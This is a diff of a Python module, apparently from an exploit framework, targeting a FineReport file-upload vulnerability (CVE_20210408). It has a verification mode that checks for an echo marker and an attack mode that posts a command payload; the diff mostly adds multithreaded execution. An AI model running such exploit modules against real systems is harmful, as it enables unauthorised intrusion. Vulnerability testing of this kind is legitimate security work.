@@ -1,7 +1,6 @@
 from util.ExpRequest import ExpRequest,Output
 from ClassCongregation import random_name
-from operator import methodcaller
-import re
+import util.globalvar as GlobalVar
 """
 --FineReport--
 CVE_20210408  [upload]，默认self.vuln = None
@@ -21,7 +20,6 @@ class FineReport():
         self.retry_interval = int(env.get('retry_interval'))
         self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
         self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
-        self.status = env.get('status')
             
     def CVE_20210408_FineReport(self):
         appName = 'FineReport'
@@ -52,31 +50,42 @@ class FineReport():
                 request = exprequest.post(self.url + path, data=payload_verify, headers=headers, timeout=self.timeout, verify=False)
                 request = exprequest.get(self.url + '/WebReport/' + name, headers=headers, timeout=self.timeout, verify=False)
                 if 'VuLnEcHoPoCSuCCeSS' in request.text:
-                    output.echo_success(method, info)
-                    self.status = 'success'
+                    return output.echo_success(method, info)
                 else:
-                    output.fail()
+                    return output.fail()
             #_attack
             else:
                 request = exprequest.post(self.url + path, data=payload, headers=headers, timeout=self.timeout, verify=False)
                 print(self.url + path)
         except Exception as error:
-            output.error_output(str(error))
+            return output.error_output(str(error))
 
 def check(**kwargs):
+    from concurrent.futures import ThreadPoolExecutor,wait,ALL_COMPLETED
     result_list = []
+    thread_list = []
     result_list.append('----------------------------')
+    #5代表只能开启5个进程, 不加默认使用cpu的进程数
+    pool = ThreadPoolExecutor(int(kwargs['pool_num']))
     ExpFineReport = FineReport(**kwargs)
     if kwargs['pocname'] != 'ALL':
-        func = getattr(ExpFineReport, kwargs['pocname'])#返回对象函数属性值，可以直接调用
-        func()#调用函数
-        return ExpFineReport.status
-    else:#调用所有函数
+        #返回对象函数属性值，可以直接调用
+        func = getattr(ExpFineReport, kwargs['pocname'])
+        #调用函数
+        return func()
+    #调用所有函数
+    else:
         for func in dir(FineReport):
             if not func.startswith("__"):
-                methodcaller(func)(ExpFineReport)
-                result_list.append(func+' -> '+ExpFineReport.status)
-                ExpFineReport.status = 'fail'
+                thread_list.append(pool.submit(getattr(ExpFineReport, func)))
+        #保存全局子线程列表
+        GlobalVar.set_value('thread_list', thread_list)
+        #等待所有多线程任务运行完
+        wait(thread_list, return_when=ALL_COMPLETED)
+        for task in thread_list:
+            #去除取消掉的future任务
+            if task.cancelled() == False:
+                result_list.append(task.result())
     result_list.append('----------------------------')
     return '\n'.join(result_list)
 
